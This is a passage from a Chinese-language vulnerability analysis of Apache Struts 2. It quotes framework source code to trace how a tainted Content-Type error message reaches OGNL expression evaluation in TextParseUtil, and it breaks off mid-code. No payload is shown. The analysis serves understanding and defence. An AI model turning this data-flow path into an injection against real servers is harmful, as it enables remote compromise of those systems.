<p>它返回的LocalizedMessage定义了一个简单的类似容器的对象，其中textKey设置为struts.messages.upload.error.InvalidContentTypeException，defaultMessage被设置为用户输入感染的异常消息。</p>
<p>接下来在stacktrace中，我们可以看到JakartaMultiPartRequest的解析方法在第86行的MultiPartRequestWrapper的构造方法中被调用，在第88行调用的addError方法会检查是否已经看到错误，如果不是，它会将它添加到一个包含LocalizedMessage对象集合的实例变量中：</p>
<pre class="brush:html;toolbar:false;">core/src/main/java/org/apache/struts2/dispatcher/multipart/MultiPartRequestWrapper.java:77:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;MultiPartRequestWrapper(MultiPartRequest&nbsp;multiPartRequest,&nbsp;HttpServletRequest&nbsp;request,78:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;saveDir,&nbsp;LocaleProvider&nbsp;provider,79:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;boolean&nbsp;disableRequestAttributeValueStackLookup)&nbsp;{80:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;super(request,&nbsp;disableRequestAttributeValueStackLookup);[..snip..]85:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try&nbsp;{86:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;multi.parse(request,&nbsp;saveDir);87:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(LocalizedMessage&nbsp;error&nbsp;:&nbsp;multi.getErrors())&nbsp;{88:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;addError(error);89:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre>
<p>在我们对堆栈进行轨迹跟踪的下一行，我们看到Dispatcher类负责实例化一个新的MultiPartRequestWrapper对象并调用上面的构造方法。这里调用的方法叫做wrapRequest，它负责检测请求的内容类型是否包含第801行的子串“multipart / form-data”，如果包含，则在第804行创建一个新的MultiPartRequestWrapper并返回：</p>
<pre class="brush:html;toolbar:false;">core/src/main/java/org/apache/struts2/dispatcher/Dispatcher.java:794:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;HttpServletRequest&nbsp;wrapRequest(HttpServletRequest&nbsp;request)&nbsp;throws&nbsp;IOException&nbsp;{795:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;don&#039;t&nbsp;wrap&nbsp;more&nbsp;than&nbsp;once796:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(request&nbsp;instanceof&nbsp;StrutsRequestWrapper)&nbsp;{797:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;request;798:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}799:800:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;content_type&nbsp;=&nbsp;request.getContentType();801:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(content_type&nbsp;!=&nbsp;null&nbsp;&amp;&amp;&nbsp;content_type.contains(&quot;multipart/form-data&quot;))&nbsp;{802:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MultiPartRequest&nbsp;mpr&nbsp;=&nbsp;getMultiPartRequest();803:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LocaleProvider&nbsp;provider&nbsp;=&nbsp;getContainer().getInstance(LocaleProvider.class);804:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;request&nbsp;=&nbsp;new&nbsp;MultiPartRequestWrapper(mpr,&nbsp;request,&nbsp;getSaveDir(),&nbsp;provider,&nbsp;disableRequestAttributeValueStackLookup);805:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{806:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;request&nbsp;=&nbsp;new&nbsp;StrutsRequestWrapper(request,&nbsp;disableRequestAttributeValueStackLookup);807:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}808:809:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;request;810:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre>
<p>在我们分析的这个样本时，它的HTTP请求已被解析，我们的包裹请求对象（MultiPartRequestWrapper）持有一个错误（LocalizedMessage）和我们的默认消息，而一个textKey设置为struts.messages.upload.error.InvalidContentTypeException。</p>
<p>虽然堆栈轨迹的其余部分不能为我们继续跟踪数据流提供任何非常有用的帮助，但是，我们从中发现了一个线索， Struts通过一系列拦截器处理请求。事实证明，名为FileUploadInterceptor的拦截器是Struts配置的默认“堆栈”的一部分。</p>
<p>正如我们在第242行看到的，拦截器会检查我们的请求对象是否是MultiPartRequestWrapper类的实例。我们知道这是因为Dispatcher以前返回了这个类的一个实例，拦截器会继续检查MultiPartRequestWrapper对象是否在第261行出现错误。然后它在第264行调用LocalizedTextUtil的findText方法，传递几个参数，例如错误的textKey和我们的默认的defaultMessage：</p>
<pre class="brush:html;toolbar:false;">core/src/main/java/org/apache/struts2/interceptor/FileUploadInterceptor.java:237:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;String&nbsp;intercept(ActionInvocation&nbsp;invocation)&nbsp;throws&nbsp;Exception&nbsp;{238:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ActionContext&nbsp;ac&nbsp;=&nbsp;invocation.getInvocationContext();239:240:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HttpServletRequest&nbsp;request&nbsp;=&nbsp;(HttpServletRequest)&nbsp;ac.get(ServletActionContext.HTTP_REQUEST);241:242:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!(request&nbsp;instanceof&nbsp;MultiPartRequestWrapper))&nbsp;{243:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(LOG.isDebugEnabled())&nbsp;{244:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ActionProxy&nbsp;proxy&nbsp;=&nbsp;invocation.getProxy();245:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOG.debug(getTextMessage(&quot;struts.messages.bypass.request&quot;,&nbsp;new&nbsp;String[]{proxy.getNamespace(),&nbsp;proxy.getActionName()}));246:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}247:248:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;invocation.invoke();249:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}250:[..snip..]259:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MultiPartRequestWrapper&nbsp;multiWrapper&nbsp;=&nbsp;(MultiPartRequestWrapper)&nbsp;request;260:261:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(multiWrapper.hasErrors())&nbsp;{262:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(LocalizedMessage&nbsp;error&nbsp;:&nbsp;multiWrapper.getErrors())&nbsp;{263:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(validation&nbsp;!=&nbsp;null)&nbsp;{264:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;validation.addActionError(LocalizedTextUtil.findText(error.getClazz(),&nbsp;error.getTextKey(),&nbsp;ActionContext.getContext().getLocale(),&nbsp;error.getDefaultMessage(),&nbsp;error.getArgs()));265:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}266:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}267:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre>
<p>LocalizedTextUtil的方法findText的一个版本被调用，它试图根据以下6个因素找到一个返回的错误信息：</p>
<pre class="brush:html;toolbar:false">aClassName设置为AbstractMultiPartRequest
aTextName设置为错误的textKey，这是struts.messages.upload.error.InvalidContentTypeException。
区域设置设置为ActionContext的区域设置。
defaultMessage是我们作为字符串感染的异常消息。
Args是一个空数组。</pre>
<p>valueStack设置为ActionContext的valueStack：</p>
<pre class="brush:html;toolbar:false;">397:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**398:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;p&gt;399:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Finds&nbsp;a&nbsp;localized&nbsp;text&nbsp;message&nbsp;for&nbsp;the&nbsp;given&nbsp;key,&nbsp;aTextName.&nbsp;Both&nbsp;the&nbsp;key&nbsp;and&nbsp;the&nbsp;message400:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;itself&nbsp;is&nbsp;evaluated&nbsp;as&nbsp;required.&nbsp;&nbsp;The&nbsp;following&nbsp;algorithm&nbsp;is&nbsp;used&nbsp;to&nbsp;find&nbsp;the&nbsp;requested401:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;message:402:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;/p&gt;403:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*404:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;ol&gt;405:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;li&gt;Look&nbsp;for&nbsp;message&nbsp;in&nbsp;aClass&#039;&nbsp;class&nbsp;hierarchy.406:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;ol&gt;407:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;li&gt;Look&nbsp;for&nbsp;the&nbsp;message&nbsp;in&nbsp;a&nbsp;resource&nbsp;bundle&nbsp;for&nbsp;aClass&lt;/li&gt;408:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;li&gt;If&nbsp;not&nbsp;found,&nbsp;look&nbsp;for&nbsp;the&nbsp;message&nbsp;in&nbsp;a&nbsp;resource&nbsp;bundle&nbsp;for&nbsp;any&nbsp;implemented&nbsp;interface&lt;/li&gt;409:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;li&gt;If&nbsp;not&nbsp;found,&nbsp;traverse&nbsp;up&nbsp;the&nbsp;Class&#039;&nbsp;hierarchy&nbsp;and&nbsp;repeat&nbsp;from&nbsp;the&nbsp;first&nbsp;sub-step&lt;/li&gt;410:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;/ol&gt;&lt;/li&gt;411:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;li&gt;If&nbsp;not&nbsp;found&nbsp;and&nbsp;aClass&nbsp;is&nbsp;a&nbsp;{@link&nbsp;ModelDriven}&nbsp;Action,&nbsp;then&nbsp;look&nbsp;for&nbsp;message&nbsp;in412:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;the&nbsp;model&#039;s&nbsp;class&nbsp;hierarchy&nbsp;(repeat&nbsp;sub-steps&nbsp;listed&nbsp;above).&lt;/li&gt;413:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;li&gt;If&nbsp;not&nbsp;found,&nbsp;look&nbsp;for&nbsp;message&nbsp;in&nbsp;child&nbsp;property.&nbsp;&nbsp;This&nbsp;is&nbsp;determined&nbsp;by&nbsp;evaluating414:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;the&nbsp;message&nbsp;key&nbsp;as&nbsp;an&nbsp;OGNL&nbsp;expression.&nbsp;&nbsp;For&nbsp;example,&nbsp;if&nbsp;the&nbsp;key&nbsp;is415:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;i&gt;user.address.state&lt;/i&gt;,&nbsp;then&nbsp;it&nbsp;will&nbsp;attempt&nbsp;to&nbsp;see&nbsp;if&nbsp;&quot;user&quot;&nbsp;can&nbsp;be&nbsp;resolved&nbsp;into&nbsp;an416:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;object.&nbsp;&nbsp;If&nbsp;so,&nbsp;repeat&nbsp;the&nbsp;entire&nbsp;process&nbsp;fromthe&nbsp;beginning&nbsp;with&nbsp;the&nbsp;object&#039;s&nbsp;class&nbsp;as417:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;aClass&nbsp;and&nbsp;&quot;address.state&quot;&nbsp;as&nbsp;the&nbsp;message&nbsp;key.&lt;/li&gt;418:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;li&gt;If&nbsp;not&nbsp;found,&nbsp;look&nbsp;for&nbsp;the&nbsp;message&nbsp;in&nbsp;aClass&#039;&nbsp;package&nbsp;hierarchy.&lt;/li&gt;419:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;li&gt;If&nbsp;still&nbsp;not&nbsp;found,&nbsp;look&nbsp;for&nbsp;the&nbsp;message&nbsp;in&nbsp;the&nbsp;default&nbsp;resource&nbsp;bundles.&lt;/li&gt;420:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;li&gt;Return&nbsp;defaultMessage&lt;/li&gt;421:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;&lt;/ol&gt;</pre>
<p>因为未找到资源束定义struts.messages.upload.error.InvalidContentTypeException的错误消息，所以此过程最终将调用第573行上的getDefaultMessage方法：</p>
<pre class="brush:html;toolbar:false;">core/src/main/java/com/opensymphony/xwork2/util/LocalizedTextUtil.java:570:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;get&nbsp;default571:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GetDefaultMessageReturnArg&nbsp;result;572:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(indexedTextName&nbsp;==&nbsp;null)&nbsp;{573:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;getDefaultMessage(aTextName,&nbsp;locale,&nbsp;valueStack,&nbsp;args,&nbsp;defaultMessage);574:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{575:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;getDefaultMessage(aTextName,&nbsp;locale,&nbsp;valueStack,&nbsp;args,&nbsp;null);576:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(result&nbsp;!=&nbsp;null&nbsp;&amp;amp;&amp;amp;&nbsp;result.message&nbsp;!=&nbsp;null)&nbsp;{577:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;result.message;578:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}579:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;getDefaultMessage(indexedTextName,&nbsp;locale,&nbsp;valueStack,&nbsp;args,&nbsp;defaultMessage);580:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre>
<p>同一个类中的getDefaultMessage方法负责最后一次尝试找到一个给定密钥和语言环境的错误消息。在我们的尝试过程中，getDefaultMessage方法尝试失败，并利用我们的异常消息，在第729行调用TextParseUtil的translateVariables方法：</p>
<pre class="brush:html;toolbar:false;">core/src/main/java/com/opensymphony/xwork2/util/LocalizedTextUtil.java:714:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;static&nbsp;GetDefaultMessageReturnArg&nbsp;getDefaultMessage(String&nbsp;key,&nbsp;Locale&nbsp;locale,&nbsp;ValueStack&nbsp;valueStack,&nbsp;Object[]&nbsp;args,715:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;defaultMessage)&nbsp;{716:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GetDefaultMessageReturnArg&nbsp;result&nbsp;=&nbsp;null;717:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;boolean&nbsp;found&nbsp;=&nbsp;true;718:719:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(key&nbsp;!=&nbsp;null)&nbsp;{720:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;message&nbsp;=&nbsp;findDefaultText(key,&nbsp;locale);721:722:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(message&nbsp;==&nbsp;null)&nbsp;{723:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;message&nbsp;=&nbsp;defaultMessage;724:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;found&nbsp;=&nbsp;false;&nbsp;//&nbsp;not&nbsp;found&nbsp;in&nbsp;bundles725:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}726:727:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;defaultMessage&nbsp;may&nbsp;be&nbsp;null728:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(message&nbsp;!=&nbsp;null)&nbsp;{729:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MessageFormat&nbsp;mf&nbsp;=&nbsp;buildMessageFormat(TextParseUtil.translateVariables(message,&nbsp;valueStack),&nbsp;locale);730:731:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;msg&nbsp;=&nbsp;formatWithNullDetection(mf,&nbsp;args);732:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;new&nbsp;GetDefaultMessageReturnArg(msg,&nbsp;found);733:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}734:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}735:736:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;result;737:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre>
<p>事实证明，TextParseUtil的translateVariables方法是用于表达式语言评估的数据接收器。它通过评估包含在$ {&#8230;}和％{&#8230;}的实例中的OGNL表达式来提供简单的模板功能，定义并调用了几个版本的translateVariables方法，最后评估第166行的表达式：</p>
<pre class="brush:html;toolbar:false;">core/src/main/java/com/opensymphony/xwork2/util/TextParseUtil.java:34:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/**35:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;Converts&nbsp;all&nbsp;instances&nbsp;of&nbsp;${...},&nbsp;and&nbsp;%{...}&nbsp;in&nbsp;&lt;code&gt;expression&lt;/code&gt;&nbsp;to&nbsp;the&nbsp;value&nbsp;returned36:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;by&nbsp;a&nbsp;call&nbsp;to&nbsp;{@link&nbsp;ValueStack#findValue(java.lang.String)}.&nbsp;If&nbsp;an&nbsp;item&nbsp;cannot37:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;be&nbsp;found&nbsp;on&nbsp;the&nbsp;stack&nbsp;(null&nbsp;is&nbsp;returned),&nbsp;then&nbsp;the&nbsp;entire&nbsp;variable&nbsp;${...}&nbsp;is&nbsp;not38:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;displayed,&nbsp;just&nbsp;as&nbsp;if&nbsp;the&nbsp;item&nbsp;was&nbsp;on&nbsp;the&nbsp;stack&nbsp;but&nbsp;returned&nbsp;an&nbsp;empty&nbsp;string.39:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*40:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;expression&nbsp;an&nbsp;expression&nbsp;that&nbsp;hasn&#039;t&nbsp;yet&nbsp;been&nbsp;translated41:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;stack&nbsp;value&nbsp;stack42:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@return&nbsp;the&nbsp;parsed&nbsp;expression43:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/44:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;String&nbsp;translateVariables(String&nbsp;expression,&nbsp;ValueStack&nbsp;stack)&nbsp;{45:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;translateVariables(new&nbsp;char[]{&#039;$&#039;,&nbsp;&#039;%&#039;},&nbsp;expression,&nbsp;stack,&nbsp;String.class,&nbsp;null).toString();46:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}[..snip..]152:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;static&nbsp;Object&nbsp;translateVariables(char[]&nbsp;openChars,&nbsp;String&nbsp;expression,&nbsp;final&nbsp;ValueStack&nbsp;stack,&nbsp;final&nbsp;Class&nbsp;asType,&nbsp;final&nbsp;ParsedValueEvaluator&nbsp;evaluator,&nbsp;int&nbsp;maxLoopCount)&nbsp;{153:154:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ParsedValueEvaluator&nbsp;ognlEval&nbsp;=&nbsp;new&nbsp;ParsedValueEvaluator()&nbsp;{155:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;Object&nbsp;evaluate(String&nbsp;parsedValue)&nbsp;{156:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object&nbsp;o&nbsp;=&nbsp;stack.findValue(parsedValue,&nbsp;asType);157:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(evaluator&nbsp;!=&nbsp;null&nbsp;&amp;&amp;&nbsp;o&nbsp;!=&nbsp;null)&nbsp;{158:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;o&nbsp;=&nbsp;evaluator.evaluate(o.toString());159:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}160:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs